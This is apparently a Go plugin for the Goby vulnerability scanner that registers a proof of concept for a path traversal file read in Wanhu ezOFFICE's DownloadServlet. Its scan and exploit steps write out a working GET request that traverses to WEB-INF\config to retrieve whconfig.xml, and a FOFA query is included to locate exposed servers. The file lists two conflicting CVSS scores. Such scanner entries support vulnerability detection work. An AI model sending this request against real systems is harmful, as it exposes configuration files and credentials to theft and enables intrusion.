package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Wanhu ezOFFICE /defaultroot/DownloadServlet interface path parameter file reading vulnerability",
    "Description": "<p>ezOFFICE is an office software suite designed to provide a series of office application tools to help users perform tasks such as document processing, data analysis, communication and collaboration. This suite usually includes functions such as word processing, spreadsheet editing, and presentation creation, similar to Microsoft Office or Google Workspace.</p><p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., making the website extremely insecure, including plaintext account passwords</p>",
    "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"http://www.whir.net/\">http://www.whir.net/</a></p>",
    "Product": "Whir-ezOFFICE",
    "VulType": [
        "File Read"
    ],
    "Tags": [
        "File Read"
    ],
    "Translation": {
        "CN": {
            "Name": "万户 ezOFFICE /defaultroot/DownloadServlet 接口 path 参数文件读取漏洞",
            "Product": "万户网络-ezOFFICE",
            "Description": "<p>ezOFFICE 是一款办公软件套件，旨在提供一系列办公应用工具，帮助用户进行文档处理、数据分析、沟通协作等任务。这个套件通常包括文字处理、表格编辑、演示文稿制作等功能，类似于 Microsoft Office 或者 Google Workspace。<br></p><p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"http://www.whir.net/\" target=\"_blank\">http://www.whir.net/</a></p>",
            "Impact": "<p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Wanhu ezOFFICE /defaultroot/DownloadServlet interface path parameter file reading vulnerability",
            "Product": "Whir-ezOFFICE",
            "Description": "<p>ezOFFICE is an office software suite designed to provide a series of office application tools to help users perform tasks such as document processing, data analysis, communication and collaboration. This suite usually includes functions such as word processing, spreadsheet editing, and presentation creation, similar to Microsoft Office or Google Workspace.</p><p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., making the website extremely insecure<span style=\"color: var(--primaryFont-color);\">, including plaintext account passwords</span></p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"http://www.whir.net/\" target=\"_blank\">http://www.whir.net/</a><br></p>",
            "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "FofaQuery": "title=\"ezOFFICE\" || body=\"EZOFFICEUSERNAME\" || title=\"万户OA\" || body=\"whirRootPath\" || body=\"/defaultroot/js/cookie.js\" || header=\"LocLan\"",
    "GobyQuery": "title=\"ezOFFICE\" || body=\"EZOFFICEUSERNAME\" || title=\"万户OA\" || body=\"whirRootPath\" || body=\"/defaultroot/js/cookie.js\" || header=\"LocLan\"",
    "Author": "jweny1@qq.com",
    "Homepage": "http://www.whir.net/cn/ezofficeqyb/index_52.html",
    "DisclosureDate": "2022-04-06",
    "References": [],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "9.0",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/defaultroot/DownloadServlet?key=&path=..\\WEB-INF\\config&FileName=whconfig.xml&name=whconfig.xml",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "EzOffice",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "text/xml",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/defaultroot/DownloadServlet?key=&path=..\\WEB-INF\\config&FileName=whconfig.xml&name=whconfig.xml",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "EzOffice",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "text/xml",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "CVSSScore": "7.8",
    "PocId": "10473"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
